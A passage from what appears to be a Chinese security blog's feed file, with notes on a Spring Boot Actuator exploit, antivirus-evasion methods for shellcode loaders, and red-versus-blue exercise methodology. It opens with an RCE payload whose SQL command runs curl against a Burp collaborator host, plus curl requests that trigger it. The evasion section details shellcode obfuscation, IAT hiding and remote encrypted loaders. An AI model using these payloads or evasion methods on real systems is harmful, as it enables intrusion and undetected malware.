java.util.Scanner(Runtime.getRun\&#39;,\&#39;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\&#39;);CALL EXEC(\&#39;curl http://x.burpcollaborator.net\&#39;);\&quot;&#125;&#39; &#39;http://192.168.79.28:8080/actuator/env&#39;#发送expcurl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; &#39;http://192.168.79.28:8080/actuator/restart&#39;   # 触发exp</code></pre><h3 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h3><ol><li>引入 security 依赖，打开安全限制并进行身份验证</li><li>设置单独的 Actuator 管理端口并配置不对外网开放</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>免杀思路</title>
      <link href="Kali/PostExploit/%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF.html"/>
      <url>Kali/PostExploit/%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="杀毒软件常见检测方法："><a href="#杀毒软件常见检测方法：" class="headerlink" title="杀毒软件常见检测方法："></a>杀毒软件常见检测方法：</h2><p>通常分为静态特征查杀和动态行为检测(包括沙箱)</p><ul><li><p>静态特征查杀，基于匹配特征码，与病毒库里面的md5进行比较。</p><pre><code> 做法：模糊哈希算法，机器学习跑模型 ， </code></pre><p>绕过：利用myccl工具查找定位复合特征码 或手工（单步查杀找到特征码）对特征码进行混淆处理</p></li><li><p>动态行为检测 ，沙箱执行可以程序 </p><pre><code> 做法：hook关键api，监控注册表启动项，系统文件，防止对其修改    绕过： 沙箱检测(检测线程数)，文件重命名检测 延时(类似cobaltstrike的睡眠机制，用钩子在睡眠时间内存权限设置读写，在非睡眠时改回可执行。)</code></pre></li></ul><h2 id="熟悉各个杀软的查杀特性"><a href="#熟悉各个杀软的查杀特性" class="headerlink" title="熟悉各个杀软的查杀特性"></a>熟悉各个杀软的查杀特性</h2><ul><li><p>火绒： 重点基于字符串去查杀，<br>做法：重点针对函数如regMovememory进行字符串混淆或更换函数</p></li><li><p>360： 重点基于函数具体触发的行为去查杀 <br>做法： 延时，沙箱检测，文件重命名检测</p></li><li><p>WinDefender： 重点基于特定位置，特征码去查杀   <br>做法：找特征码去混淆</p></li></ul><h2 id="针对各个杀软的特点进行自定义加载器"><a href="#针对各个杀软的特点进行自定义加载器" class="headerlink" title="针对各个杀软的特点进行自定义加载器"></a>针对各个杀软的特点进行自定义加载器</h2><p>免杀处理思路：</p><ol><li><p>源码免杀，（有源码时） 定位特征码，进行混淆<br>a)如内嵌汇编加载、内存免杀(渐进式申请一块内存，最后改为可执行)、分离免杀、二次编译、<br>b)隐藏IAT、强制类型转换、加花指令、多层跳转、加无效指令、替换/重写API、API伪调用等<br>c)shellcode进行异或 编码base64，AES加密等 </p></li><li><p>无源码免杀，在源码不好修改时，<br>a)resourceHacker资源修改、<br>b)vmp加壳、加签名、PE优化等组合使用</p></li><li><p>白名单exe/dll免杀-如rundll32、msbuild、mshta、cscript等</p></li><li><p>Powershell混淆绕过  – 根据powershell语言特性，字符串转换，变量转换，编码，压缩等</p></li><li><p>偏僻语言编写shellcode</p></li><li><p>加载器分离免杀</p></li></ol><h2 id="简述远程加载器分离免杀的思路比较好，实现代码逻辑"><a href="#简述远程加载器分离免杀的思路比较好，实现代码逻辑" class="headerlink" title="简述远程加载器分离免杀的思路比较好，实现代码逻辑"></a>简述远程加载器分离免杀的思路比较好，实现代码逻辑</h2><p>  规避网络测绘-&gt;shellcode混淆-&gt;beacon去特征<br>大体思路：<br>Winhttp库或window sockets实现http请求（cs使用winInet库） –&gt; 存在问题：容易暴露自己C2和文件服务器地址(域前置解决)<br>对shellcode进行AES动态加密</p><ul><li>服务器<br>用netty框架，采用select多客户端模型 写一个web服务器，获取请求发过来的key值，用key对shellcode进行加密，响应给客户端</li><li>客户端（C++加载器）</li></ul><ol><li>每次请求shellcode时随机生成一个key值，通过http请求将key发送到服务器</li><li>服务器使用key对shellcode进行AES加密或shellcode每一位与key进行异或操作，响应给客户端</li><li>用cryptopp库进行AES解密shellcode，virtualAlloc采用渐进式申请内存空间，使用memcpy拷贝shellcode到内存中，最后调用这个内存地址</li></ol><p>甚至可以将loader是否也可以尝试一下，客户端仅保留下载loader和shellcode的功能</p><p>shellcode生成工具-donut，对Execute-Assembly进一步利用，将exe,dll,vbs,js转成shellcode<br>shellcode混淆器-Obfuscator<br>修改加载器特征<br>加载器特征= A「shellcode+硬编码字符串」 + B 「virtualAlloc，virtualProtect函数」</p><p>修改方法：<br>          对A进行 base64编码+加密（如xor）(更安全)，   <br>         对B插入花指令(无意义代码)， 可以使用HeapAlloc替换virtualAlloc函数<br>修改加载器的特征</p><p>对<code>func_get_delegate_type</code>，<code>func_get_proc_address</code>两个函数重命名替换，对函数里面的一些变量进行重新定义</p><h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode加载器=S_0「shellcode_downloader」+ S_1「donwlod+run_shellcode」<br>通常杀软只检测一个进程的行为，<br>做法： 使用windows管道，socket通道<br>分离免杀，将shellcode写入到文件中和加载器分离开，在加载器启动执行时再将shellcode从文件当中读取进来。</p><h3 id="修改资源"><a href="#修改资源" class="headerlink" title="修改资源"></a>修改资源</h3><p>杀软会检测文件的描述，版本号，创建日期作为特征检测<br>做法： 使用restorator对目标修改资源文件</p><h3 id="隐藏IAT"><a href="#隐藏IAT" class="headerlink" title="隐藏IAT"></a>隐藏IAT</h3><p>杀软检测导入表中是否存在可疑函数<br>做法： opt1 调用getProcessAddress获取所需函数地址<br>opt2  用汇编从Teb里找到kernel32.dll地址，再从其导出表中获取所需系统函数</p><h2 id="msf与cs的stager对比分析"><a href="#msf与cs的stager对比分析" class="headerlink" title="msf与cs的stager对比分析"></a>msf与cs的stager对比分析</h2><p>  相同点： 通过WinInet系列函数远程加载stage并使用VirtualAlloc为其分配一块rwx的内存空间，最后转去执行stage<br>  不同点： cs比msf多调用几个函数 InternetErrorDlg, GetDesktopWindow, GetLastError</p><h3 id="payload加载方式基本一致-cs参考msf，都支持stager和stageless方式加载"><a href="#payload加载方式基本一致-cs参考msf，都支持stager和stageless方式加载" class="headerlink" title="payload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载)"></a>payload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载)</h3><p>meterpreter加载顺序：stager-&gt;metsrv.dll-&gt;stdapi.dll<br>           cs-beacon加载顺序： stgaer-&gt;beacon.dll</p><h3 id="C2实现方式："><a href="#C2实现方式：" class="headerlink" title="C2实现方式："></a>C2实现方式：</h3><pre><code>   meterpreter的handler实现：TCPServer结合resources实现的简易HTTP服务   Beacon的Listener实现：基于NanoHTTPD实现(成熟稳定)</code></pre><h3 id="通信协议上差异："><a href="#通信协议上差异：" class="headerlink" title="通信协议上差异："></a>通信协议上差异：</h3><pre><code>cs和msf均使用http/s进行数据通信，但具体传输方式上有差异    meterpreter使用HTTP 1.1 ，默认使用keep-alive功能，且不能关闭 （不稳定）    Beacon使用HTTP 1.1 ，但默认不开启keep-alive功能 且支持抖动特性</code></pre><p>具体的表现为在实际使用过程中,Meterpreter与C2服务器始终保持一条TCP连接,且对TCP连接的状态没有监控. 相对应的Beacon在请求任务/返回结果时会与C2建立连接,而在sleep阶段与C2没有网络连接. </p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> PostExploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红蓝对抗</title>
      <link href="Kali/PostExploit/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97.html"/>
      <url>Kali/PostExploit/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><ul><li>红蓝对抗<br>组织 <em>多支攻击队伍</em>  对 <em>各行业重点点位目标系统</em> 进行集中攻击，检验防守方的防护能力，通过预判的规则，以积分形式确定双方的排名。</li></ul><ul><li><p>攻击者(经授权的国家科研机构、安全公司/团队)</p></li><li><p>防守方(系统运营单位、其他协同防护主体)</p></li><li><p>裁判组(组织方、第三方权威机构)</p></li><li><p><input disabled="" type="checkbox">  得分场景</p><ol><li>积极配合应急组工作，根据线索能快速准确定位受害系统，能提供充分的日志记录，配合执法机关固定证据完成勘验发现木马攻击</li><li>发现漏洞攻击，记录完整的攻击路径，并需触发响应的应急处置流程</li><li>处置Webshell木马或主机木马程序，并需触发响应的应急处置流程</li><li>处置主机异常新增账户，处置被爆破账户密码，并需触发响应的应急处置流程</li><li>处置Web系统、FTP等异常新增账户，处置被爆破账户密码消除其他威胁</li><li>发现钓鱼攻击，快速定位钓鱼样本，并提交样本分析报告</li><li>发现社会工程攻击，上报攻击者有效个人信息(职位、姓名、电话、公司)等</li><li>发现并成功溯源攻击者，上报攻击者有效信息(IP、设备信息、个人信息)</li><li>发现并成功反制攻击者，控制攻击者主机及网络环境</li></ol></li><li><p><input disabled="" type="checkbox">  失分场景</p><ol><li>被获取域控服务器权限</li><li>被获取路由器、交换机、防火墙等网络设备权限</li><li>被获取Web应用系统服务器、邮件服务器、数据库服务器等权限</li><li>被获取业务内网邮箱、FTP应用、Web应用系统、数据库远程访问、互联网VPN接入系统的账户密码</li><li>被获取Webshell权限</li><li>被获取终端计算机权限</li><li>被获取其他设备权限</li></ol></li></ul><p>** 攻击队<br>基本攻击思路</p><ol><li>主要资产正面突破<br>此路径系统漏洞相对较少，防护设备与安全措施相对更严密，攻击难度大且易被察觉，但由于资产重要程度较高，有所突破能有较大收益</li><li>边缘资产迂回突破<br>此处防御相对薄弱，监控缺失，攻击难度较小，但若要进一步入侵核心层，往往还需要多次横向和纵向的扩展</li><li>第三方侧面入侵<br>利用上下游公司、外包开发商等与企业的网络具有关联性的机构，攻击者可通过首先入侵第三方，再扩展到企业，从而达到侧面入侵的目的</li><li>以人为突破口<br>瞄准安全意识薄弱的员工进行钓鱼等社工，可以广撒网，也可以精准打击运维等具有管理权限的员工</li><li>利用联网的硬件入侵<br>通过联网的设备，利用网络互联、隔离不够等防护脆弱点，实现目标的迂回攻击</li></ol><p>*** 初始信息收集<br>攻击者搜集关于目标组织的人员信息、组织架构、网络资产、技术框架及安全措施信息，后期这些信息将为攻击决策提供支撑。<br>收集信息的种类报告但不限于分支机构、关联公司、外包公司、投资公司、人员、网络、主机、域名、账户、邮箱等信息。<br>可进行收集信息的公开渠道：</p><p>| 天眼查 | 企查查 | 搜索引擎 | 社交网络  | ICP备案库 | 社工库  |<br>| Fofa   | Shodan | 官网     | 主/子域名 | BGP归属   | Zoomeye |</p><p>自动化工具常用来实现对攻击目标资产的持续跟踪，并对临时增加的资产，进行蜜罐识别探测<br>识别资产指纹，记录攻击目标资产的更详细类型，如CMS、第三方系统、组件、中间件等，以便对应到可进行利用的漏洞<br>收集攻击目标所涉及核心人员的全面信息，包括线上、社工，钓鱼等</p><p>通过自动化工具结合人工操作，持续进行信息搜集和扫描查点工作，长用手段:<br>| 高频探测     | 口令爆破、重放攻击、爬虫扫描、信息抓取 |<br>|————–+—————————————-|<br>| 敏感文件探测 | SVN泄露、Git泄露、备份文件泄露         |<br>| 敏感端口探测 | 22、3306、7001、6379、8080等           |<br>| 敏感路径探测 | 网站后台、未授权页面                   |<br>| 信息劫持攻击 | 中间人劫持、DNS劫持                    |</p><p>*** 选择攻击方案<br>对基础信息进行分析后，确认出关键任务，关键系统，边缘系统，物理地址等信息，攻击成员分工领取攻击任务，<br>方案包括：物理入侵、钓鱼邮件、Wi-Fi入侵、边缘资产渗透、互联网边界突破</p><p>*** 初始入侵<br>利用搜集到的信息，自动化攻击工具、漏洞储备资源、计算资源能力，通过利用安全意识漏洞、Nday和0day进行攻击，突破到内网区域<br>一般会先采用自动化工具进行第一波突破，若无果，再采用遍历攻击面的方式，逐个系统人工深入挖掘漏洞。</p><p>WAF对抗/IPS对抗  –&gt; EDR绕过/补丁绕过  –&gt; 漏洞利用/Webshell</p><ul><li>扫描器产出漏洞深入利用</li><li>利用员工账户爆破VPN系统</li><li>上传Webshell进一步获取控制权</li><li>OA系统/邮箱/VPN人工尝试登陆</li><li>尝试绕过WAF利用漏洞</li><li>人工注册业务系统账号挖掘漏洞</li></ul><p>*** 站稳脚跟<br>通过特定的工具，利用初始入侵得到的突破口，建立好进入内网的通道，同时做好隐蔽防止被发现，能稳定在内网立足</p><p> 通过虚拟机攻击云管理平台，利用管理平台控制所有机器<br>通过直接从虚拟机进行逃逸，从而控制宿主机，然后利用宿主机控制其上所有虚拟机</p><p>*** 权限提升<br>通过内核提权、不安全服务等各类手段，将攻击者的权限进行一定的提升，甚至到最高权限，一边进一步操作</p><p>*** 内部信息收集<br>利用新的立足点，进行内网的信息收集，包括内网的网络结构，脆弱服务，用户账户密码等，为下一步行动做准备</p><p>*** 横向移动<br>结合之前搜集的信息，在通过特定漏洞和工具进行横向移动，扩展到新的位置。<br>定向攻击核心目标，通过内网横向渗透，获取到更多的服务器控制权，更多的管理员信息，更多人的密码。<br>如DevOps发布系统，Jenkins/Git/SVN代码仓库、堡垒机、跳板机、开发运维、开发环境权限</p><p>*** 权限维持<br>扩展到新位置后，利用工具稳定攻击者权限，使能够立足在内网新位置</p><p>   *** 完成目标<br>通过不断的权限提升-内部信息收集-横向移动-维持权限这个循环，逐步靠近目标，最终完成目标</p><p>** 防守队</p><p>P2DR模型：是机遇策略的模型</p><ul><li><p>Policy: 策略是模型的核心，所有的防护、检测和响应都是依据安全策略实施的</p></li><li><p>Protection: 防护是根据系统可能出现的安全问题而采取的预防措施。采用的防护技术包括数据加密、身份认证、访问控制、授权和VPN技术、防火墙、安全扫描和数据备份等</p></li><li><p>Detection: 当攻击者穿越防护系统时，检测功能就发挥作用，与防护系统形成互补，检测是动态响应的依据</p></li><li><p>Response: 系统一旦检测到入侵，响应系统就开始工作，进行事件处理。</p></li><li><p>重点： 预防<br>尽可能全面理清攻击面、清理外网泄露的敏感信息，同时对资产进行相关的测试及加固</p></li><li><p>基础：检测与监测<br>明晰内外部资产状态，通过各类检测、监测的安全设备实时发现攻击痕迹，快速定位，为后续响应及溯源提供信息和证据</p></li><li><p>狙击手段：响应<br>建立完善的应急响应流程，<br>快速判断及处理未成功攻击，极致运用自动化体系减少防守人员的精力消耗<br>准备常见应急方案，快速联动处理突发情况，做到快速发现、定位分析、响应处置</p></li><li><p>得分手段：溯源<br>利用技术手段还原攻击者攻击首发，定位身份<br>通过攻击中暴漏的IP/域名或其他信息，结合威胁情报及相关渠道还原其画像，追溯到真人<br>通过部署内外网蜜罐等手段，主动诱捕在进行信息搜集/打算入侵的攻击者</p></li></ul><p>*** 常态化资产安全管理</p><ol><li><p>互联网资产测绘与检测<br>对互联网资产暴露面、互联网敏感信息泄露、互联网暴露的高危漏洞、端口和弱口令进行全面检测，并提供应急响应漏洞通告，帮助企业全面梳理互联网资产暴露风险</p></li><li><p>借助资产管理功能的安全产品<br>资产安全管理平台、主机安全管理平台</p></li><li><p>人工盘点、跟踪、核查与确认<br>梳理防火墙配置、回收老旧资产、登记新上资产<br>对主要供应链进行梳理如VPN品牌、OA/邮件供应商、系统框架组件</p></li><li><p>效果：<br>发现异常IP告警：5mins内，定位到该IP对应的资产在网络位置及物理位置，并可在技术上完成资产封堵<br>新爆发0day： 5mins内排查影响，定位受影响的资产并实施封堵</p></li></ol><p>重大保障期间：加强对互联网暴露资产进行周期性安全巡检:<br>；| 检查项                 | 内容                                                                               |<br>|————————+————————————————————————————|<br>| 互联网暴露面资产巡检   | 建立完整的互联网暴露面资产地图，包括外网全量自域名、外网全量端口指纹、外网Web指纹  |<br>| 互联网敏感信息监控     | 定期扫描企业在Github、码云、百度文库等高风险暴露渠道的信息泄露风险                 |<br>| 高危端口弱口令周期扫描 | 基于企业特点定制化弱口令集，对高危端口(SSH、MySQL、RDP、MSSQL等)进行周期弱口令探测 |<br>| 常见高危漏洞周期扫描   | 对常见高危漏洞进行周期扫描                                                         |<br>| 应急漏洞响应通告       | 结合企业暴露面资产指纹，获取互联网新增高危应急漏洞、云上捕获等情报                 |</p><ul><li>防守工作最佳实战指南</li></ul><p>** 全面检测<br>*** 网络架构分析<br>主要针对企业网络拓扑结构、安全域划分、网络访问控制规则、网络攻击路径进行调研和分析存在的网络安全问题，明确网络安全现状、为后期测试、防护加固提供方向</p><p>| 任务             | 工作内容                                                                                                         |<br>|——————+——————————————————————————————————————|<br>| 网络拓扑结构     | 通过访谈调研与工具探测，分析服务器、安全设备、网络设备、IP地址之前的关系，绘制网络拓扑                           |<br>| 安全域划分       | 根据企业拓扑结构及人员访谈，明确安全域的名称及作用、访问控制策略、安全管理措施                                   |<br>| 网络访问控制规则 | 明确域间及域内访问控制关系，梳理防火墙ACL列表及NAT列表｜                                                         |<br>| 网络攻击路径分析 | 基于实战经验梳理常见网络攻击路径，梳理内、外网易受攻击资产，互联网纵向攻击、内部网络横向攻击、集权类系统风险评估 |<br>| 入侵防护分析     | 根据网络拓扑及攻击面，梳理入侵防护现状、安全措施、安全设备覆盖度                                                 |</p><p>*** 资产梳理<br>开展资产梳理工作最好从</p><ul><li>调研[fn::人工进行访谈、调研、不间断判断、跟踪、核查与确认，确保防火墙配置、回收老旧资产、登记新资产等信息]</li><li>工具检索[fn:: 使用网络扫描等手段进行资产测绘]</li></ul><p>| 任务 | 工作内容                                                                                                                 |<br>|——+————————————————————————————————————————–|<br>| 区域 | 互联网区、办公区、生产区、开发测试区、大数据区、外联区                                                                   |<br>| 范围 | 业务系统、应用系统、办公系统、数据库、中间件、服务器、存储设备、网络设备、安全设备、网络拓扑结构                         |<br>| 纬度 | IP、域名、开放端口、服务、编号、用途、版本、型号、数据、操作系统、使用状态、账户、弱口令、通信方式、资产负责人、联系方式 |</p><p>未知资产： 企业内未确认归属、违规对互联网开放的资产,包括：</p><ul><li>公网IP地址</li><li>端口服务</li><li>Web应用</li><li>管理后台等</li></ul><p>*** 安全意识培训</p><p>| 层面       | 内容                                                         |<br>|————+————————————————————–|<br>| 政策背景   | 攻防演练活动国家、行业政策、验证体系介绍、攻防演练活动发展史 |<br>| 行业事件   | 行业内发生的安全事件解读、安全事件总结与防范措施建议         |<br>| 演练必要性 | 安全威胁演变趋势及影响，攻防演练行动解决的问题及收益         |</p><p>*** 基线评估</p><ul><li>内网基线评估 ：内网基线配置检查、漏洞扫描以内网基线扫描和应用及系统升级为主</li><li>外网基线评估 ：外网基线配置检查、漏洞扫描以Web安全基线，和Web漏洞为主</li></ul><p>*** 渗透测试</p><ol><li>内网渗透测试 ： 针对靶标系统、业务系统、域控、集中管控平台进行渗透测试</li><li>外网渗透测试 ： 针对所有暴露于互联网的应用和主机进行渗透测试</li></ol><ul><li><p>Web服务安全检测：<br>对支持Web业务稳定运行的服务进行安全检测，包括常见系统服务、常见容器组件、业务框架、业务相关支撑系统，<br>如SSH、RDP、FTP、数据库等服务，Weblogic、Tomcat、Jboss、Websphere容器、Structs2、Spring、ThinkPHP框架，<br>常见的检测项如弱口令检测、安全性配置测试、系统/服务版本检测、后门检测与排查</p></li><li><p>Web应用安全检测：<br>对被测业务功能进行安全检测，包括SQL注入、代码注入、XSS、CSRF、SSRF、XXE、越权、逻辑漏洞、文件包含、文件上传、任意文件读取、验证码安全等</p></li></ul><p>*** 客户端检测<br>通过逆向分析对APP和PC端自身安全性进行测试，包括对客户端本地存储安全、加密算法安全、加密协议安全、接口安全性等</p><p>** 专项评估<br>*** 弱口令专项评估<br>| 评估方法           | 评估范围                                                                | 评估内容                           | 解决问题                                             |<br>|——————–+————————————————————————-+————————————+——————————————————|<br>| 手动猜测、工具扫描 | 互联网区、办公区、DMZ区、针对员工OA邮箱等系统、运维人员管理口令及服务器 | 是否存在弱口令、多设备使用同一口令 | 弱口令检测以低成本方式结局最易产生严重危害的安全问题 |</p><p>*** 敏感信息专项评估<br>| 评估方法                                       | 评估内容                                                                                              | 解决问题                             |<br>|————————————————+——————————————————————————————————-+————————————–|<br>| 搜索引擎、网盘、代码托管平台、企业信息查询平台 | 未知资产(公网IP、端口服务、Web应用、管理后台等)、上传源码、内部文档资料、高层及开发人员个人信息IP地址 | 减少企业信息泄露，缩减企业资产暴露面 |</p><p>*** 邮件专项评估</p><ol><li>钓鱼邮件评估 ： 模拟真实钓鱼邮件对人员安全意识进行测试</li><li>邮箱安全评估 ：对影响邮件安全的威胁因素进行专项检测<ul><li><input disabled="" type="checkbox"> 基线检测 是否过滤垃圾邮件、开启SPF、安全审计、安全网关、配置二次认证、是否存在弱口令</li><li><input disabled="" type="checkbox"> 漏洞检测 根据邮件版本匹配Nday漏洞</li></ul></li></ol><p>*** 办公OA专项评估<br>| 任务         | 内容                                         |<br>|————–+———————————————-|<br>| 应用漏洞     | 检测OA系统是否存在Nday漏洞                   |<br>| 服务器       | 调研OA系统部署服务器所在安全区域             |<br>| 身份认证     | 认证方式、复杂度、登陆区域限制               |<br>| 权限管控     | 权限管控是否按照最小必须原则、账户是否一对一 |<br>| 数据泄露风险 | 办公OA系统涉及的人员数据、流程涉及敏感信息   |</p><p>*** VPN专项评估<br>| 任务         | 工作内容                                                               |<br>|————–+————————————————————————|<br>| 弱口令       | 根据定制化密码本检测企业VPN弱口令                                      |<br>| 身份认证     | 验证是否采用双因素认证、或同一身份认真系统                             |<br>| 账户权限管控 | 检查账户分配是否合理、是否按照最小必须原则、是否一人存多号、一号对多人 |<br>| 移动终端限制 | 检测是否存在移动终端拨入、建议攻防期间禁用                             |<br>| 0Day检测     | “军火商”VPN 0Day检测                                                   |<br>| 接入跳转     | 调研接入后可跳转区域，掌握VPN被攻破后受影响范围                        |</p><p>*** 无线Wi-Fi专项评估[fn::禁止私建热点、攻防期间停用Wi-Fi]<br>| 任务                 | 工作内容                                                                                |<br>|———————-+—————————————————————————————–|<br>| Wi-Fi登陆控制        | 在未连接上Wi-Fi时，尝试通过弱口令检测连接Wi-Fi                                          |<br>| 未更新的固件         | 连上Wi-Fi， 查看路由器固件版本，使用Nday进行攻击                                        |<br>| 路由器管理口台弱口令 | 在连接Wi-Fi时，尝试弱口令登陆路由器后台                                                 |<br>| Wi-Fi劫持            | 查看路由器固件版本，使用Nday进行攻击，拿到root权限，监控流量，抓取和修改非HTTPS的数据包 |<br>| Wi-Fi钓鱼            | 创建免费热点，设置认证，使用户收集自动连接Wi-Fi                                         |<br>| WPS攻击              | 路由器开启了WPS功能后，尝试通过物理接触，不需要密码即可连上                             |<br>| 无线协议识别         | 通过查看Wi-Fi类型，判断是否为WEP，WPA2，WPA2-PSK加密类型的Wi-Fi                         |</p><p>*** 集中管控平台专项评估<br>| 评估方法                                                                           | 评估对象                                                             |<br>|————————————————————————————+———————————————————————-|<br>| 针对预控增加配置检查，检车安全设备应用层漏洞、检测安全设备本体安全机制是否存在缺陷 | 云托管平台、终端管理平台、堡垒机、域控、集中开发平台、虚拟化管控平台 |</p><p>*** 安全设备专项评估<br>  | 层面         | 内容                         |<br>  |————–+——————————|<br>  | 应用层漏洞   | 提权等常见漏洞               |<br>  | 本身机制     | HIDS管理页面绕过登陆查看界面 |<br>  | 自有防御     | 登陆认证、权限管控           |<br>  | 安全防护机制 | 策略有效性                   |</p><p>*** 近源专项评估<br>| 评估方法                                                             | 评估对象 |<br>|———————————————————————-+———-|<br>| Wi-Fi钓鱼(模拟内部AP，欺骗员工连入Wi-Fi进行办公，对钓鱼结果进行统计) | Wi-Fi    |<br>| BadUSB(重写USB内部固件，伪装成USB键盘，通过虚拟键盘，输入恶意指令)   | HID      |<br>| 门禁前端伪造(NFC技术复制工牌)                                        | 门禁系统 |<br>| 门禁前端数据伪造(入侵门禁系统修改数据)                               | 门禁系统 |</p><p>*** 社工专项评估<br>| 类型     | 内容                                                                                                   |<br>|———-+——————————————————————————————————–|<br>| 身份伪装 | 模拟高管、需要帮助的职员、正在处理网络问题的技术支持人员、诱导企业员工提供所需信息，对诱导结果进行统计 |<br>| 通信欺骗 | 通过聊天工具搜索目标的群聊，通过伪装员工进入Q群获取信息，进一步开展诈骗，钓鱼等攻击                    |<br>| 组合社工 | 伪装猎头，和特定员工进行交流，在骗取信任后通过微信等聊天工具发送包含恶意木马的文件进一步获取信息       |</p><p>*** 重要(靶标)系统专项评估</p><ol><li><p>自身安全性评估<br>| 纬度             | 详情                                                                     |<br>|——————+————————————————————————–|<br>| 系统架构         | 服务器、中间件等                                                         |<br>| 网络架构         | 安全域划分、隔离、防护措施                                               |<br>| 数据传输         | 输出是否加密、加密是否有效                                               |<br>| 运维管理         | 何种运维方式、管理平台登陆认证、权限管理是否有效、是否有漏洞             |<br>| 安全设备覆盖情况 | 系统所在域及与系统存在访问的区域是否覆盖了安全检测设备，是否实施阻断攻击 |</p></li><li><p>访问途径评估</p><ul><li>基本访问原则(靶标系统与其他系统的访问规则)、访问控制关系</li><li>攻击者可利用攻击路径: 如互联网站点-&gt;DMZ区-&gt;内网-&gt;靶标</li><li>检测攻击路径涉及区域的安全监测、防护设备是否有效</li></ul></li><li><p>运维终端主机专项评估</p><ul><li>应用漏洞盘查（漏扫+手工验证)</li><li>访问途径评估 (ACL规则)</li><li>已有后门排查(杀毒软件、漏扫、HIDS检测)</li></ul></li></ol><p>*** 策略布防与优化<br>布防原则：</p><ul><li>梳理业务流量，保证所有请求流量都在防御体系监控范围内</li><li>核心资产具备纵深防御能力</li><li>设备防御能力合理搭配，防御能力覆盖全面(应用、网络、主机)</li><li>安全策略调优，给策略决策平台提供可信可控的基础数据</li><li>设备特点互相补充，必要时可进行旁路冗余部署</li><li>应急响应流程明确</li></ul><p>布防与加固内容：</p><ul><li>安全产品部署调整</li><li>策略调优和安全加固</li><li>应急响应流程化</li></ul><p>*** 策略覆盖度验证评估<br>策略有效性验证:</p><ul><li><p>常规： 测试策略是否生效，如and 1=1</p></li><li><p>非常规： 基于waf绕过</p></li><li><p>机制本体绕过： 防护机制绕过，不按照规则进行绕过</p><p>覆盖度验证指标<br>| 验证纬度 | 功能                                   |<br>|———-+—————————————-|<br>| 覆盖度   | 设备覆盖范围是否齐全、流量是否全部接入 |<br>| 抗绕过   | 是否还有防护被绕过的情况               |<br>| 抗淹没   | 是否还有误报情况                       |</p></li></ul><p>** 模拟验证<br>*** 红蓝对抗模拟</p><p>*** 反制模拟<br>收集攻击信息-&gt;反向渗透-&gt;攻击取证</p><p>*** 自动化封禁脚本<br>通过搭建SIEM平台或SOC平台，对WAF、全流量设备的日志进行处理，自动转发同步到防火墙上进行IP封禁。</p><p>*** 沙盘演练</p><p>** 实战对抗</p><p>*** 检测与应急(现场值守)</p><p>| 任务 | 工作内容                                                           |<br>|——+——————————————————————–|<br>| 检测 | 分析告警信息(时间、攻击类型、攻击IP、受害IP、攻击次数、检测人员等) |<br>| 分析 | 攻击是否成功，溯源情况描述、处置意见、分析责任人、是否上报等       |<br>| 处置 | 处置措施、封禁IP详情、数量、策略增加详情、处置责任人               |<br>#+TBLFM: </p><p>*** TODO 攻击反制(现场值守)</p><p>*** 情报共享(二线支持)<br>威胁情报包括：</p><ol><li>行业内情报：厂商间互相共享的一些可疑IP，攻击IP，通用漏洞信息等</li><li>前场攻防情报： 演练现场传回一些可疑IP，攻击IP，攻击手法、溯源信息等</li><li>开源威胁情报： 借助互联网上一些开源情报平台，收集、分析可靠情报</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> PostExploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nsfocus2docx.md</title>
      <link href="Kali/Exploit/Nsfocus2docx-md.html"/>
      <url>Kali/Exploit/Nsfocus2docx-md.html</url>
      
